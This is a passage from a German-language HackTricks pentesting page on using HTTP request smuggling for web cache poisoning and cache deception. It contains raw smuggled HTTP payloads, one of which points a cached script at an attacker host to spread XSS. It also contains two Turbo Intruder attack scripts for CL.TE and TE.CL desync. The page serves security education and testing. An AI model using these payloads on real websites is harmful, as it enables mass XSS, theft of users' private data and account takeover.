### Ausnutzung der Web-Cache-Vergiftung √ºber HTTP-Request-Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web-Cache-Vergiftung kann durchgef√ºhrt werden, wenn ein Bestandteil der **Front-End-Infrastruktur Inhalte zwischenspeichert**, in der Regel zur Verbesserung der Leistung. Durch Manipulation der Serverantwort ist es m√∂glich, den Cache zu **vergiften**.

Zuvor haben wir gesehen, wie Serverantworten so ver√§ndert werden k√∂nnen, dass sie einen 404-Fehler zur√ºckgeben (siehe [Grundlegende Beispiele](./#basic-examples)). √Ñhnlich ist es m√∂glich, den Server dazu zu bringen, den Inhalt von `/index.html` als Antwort auf eine Anfrage nach `/static/include.js` zu liefern. Dadurch wird der Inhalt von `/static/include.js` im Cache durch den von `/index.html` ersetzt, was dazu f√ºhrt, dass `/static/include.js` f√ºr Benutzer nicht mehr zug√§nglich ist und potenziell zu einem Denial-of-Service (DoS) f√ºhrt.

Diese Technik wird besonders wirksam, wenn eine **Open-Redirect-Schwachstelle** entdeckt wird oder wenn es eine **Weiterleitung vor Ort zu einem Open-Redirect** gibt. Solche Schwachstellen k√∂nnen ausgenutzt werden, um den zwischengespeicherten Inhalt von `/static/include.js` durch ein Skript unter der Kontrolle des Angreifers zu ersetzen und somit einen weit verbreiteten Cross-Site-Scripting (XSS)-Angriff gegen alle Clients durchzuf√ºhren, die das aktualisierte `/static/include.js` anfordern.

Nachfolgend ist eine Darstellung der Ausnutzung der **Cache-Vergiftung in Kombination mit einer Weiterleitung vor Ort zu einem Open-Redirect** dargestellt. Das Ziel besteht darin, den Cache-Inhalt von `/static/include.js` so zu √§ndern, dass JavaScript-Code, der von dem Angreifer kontrolliert wird, bereitgestellt wird:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Beachten Sie die eingebettete Anfrage, die auf `/post/next?postId=3` abzielt. Diese Anfrage wird auf `/post?postId=4` umgeleitet, wobei der Wert des **Host-Headers** verwendet wird, um die Domain zu bestimmen. Durch √Ñndern des **Host-Headers** kann der Angreifer die Anfrage auf ihre eigene Domain umleiten (**On-Site-Weiterleitung zu Open Redirect**).

Nach erfolgreichem **Socket-Poisoning** sollte eine **GET-Anfrage** f√ºr `/static/include.js` initiiert werden. Diese Anfrage wird durch die vorherige **On-Site-Weiterleitung zu Open Redirect**-Anfrage kontaminiert und ruft den Inhalt des vom Angreifer kontrollierten Skripts ab.

Anschlie√üend wird jede Anfrage f√ºr `/static/include.js` den zwischengespeicherten Inhalt des Skripts des Angreifers liefern und somit einen umfassenden XSS-Angriff starten.


### Verwendung von HTTP-Request-Smuggling zur Durchf√ºhrung von Web-Cache-T√§uschung <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Was ist der Unterschied zwischen Web-Cache-Poisoning und Web-Cache-T√§uschung?**
>
> * Bei **Web-Cache-Poisoning** veranlasst der Angreifer die Anwendung, bestimmte b√∂sartige Inhalte im Cache zu speichern, die dann anderen Anwendungsbenutzern aus dem Cache bereitgestellt werden.
> * Bei **Web-Cache-T√§uschung** veranlasst der Angreifer die Anwendung, bestimmte sensible Inhalte eines anderen Benutzers im Cache zu speichern und ruft diese Inhalte dann aus dem Cache ab.

Der Angreifer erstellt eine geschmuggelte Anfrage, die sensible benutzerspezifische Inhalte abruft. Betrachten Sie das folgende Beispiel:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Wenn dieser geschmuggelte Request einen Cache-Eintrag vergiftet, der f√ºr statischen Inhalt vorgesehen ist (z. B. `/someimage.png`), k√∂nnten die sensiblen Daten des Opfers aus `/private/messages` unter dem Cache-Eintrag des statischen Inhalts zwischengespeichert werden. Infolgedessen k√∂nnte der Angreifer diese zwischengespeicherten sensiblen Daten potenziell abrufen.

### Bewaffnung von HTTP Request Smuggling mit HTTP Response Desynchronisation

Haben Sie eine HTTP Request Smuggling-Schwachstelle gefunden und wissen nicht, wie Sie sie ausnutzen k√∂nnen? Probieren Sie diese andere Methode der Ausnutzung aus:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Turbo Intruder-Skripte

### CL.TE

Von [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Von: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Werkzeuge

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Dieses Werkzeug ist ein auf Grammatik basierender HTTP Fuzzer, der n√ºtzlich ist, um seltsame Anomalien beim Request Smuggling zu finden.

## Referenzen

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
